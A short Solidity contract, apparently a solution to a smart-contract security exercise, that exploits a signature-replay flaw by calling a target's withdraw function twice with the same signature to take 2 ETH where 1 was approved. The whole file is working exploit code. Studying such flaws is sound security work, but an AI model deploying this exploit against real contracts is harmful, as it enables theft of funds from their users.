// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ISignatureReplay {
    function withdraw(uint256 amount, bytes calldata sig) external;
}

contract SignatureReplayExploit {
    ISignatureReplay immutable target;

    constructor(address _target) {
        target = ISignatureReplay(_target);
    }

    receive() external payable {}

    function pwn(bytes calldata sig) external {
        // SignatureReplay approves contract to withdraw 1 ETH
        // but does not prevent re-using the same signature
        target.withdraw(1 ether, sig);
        target.withdraw(1 ether, sig);
    }
}
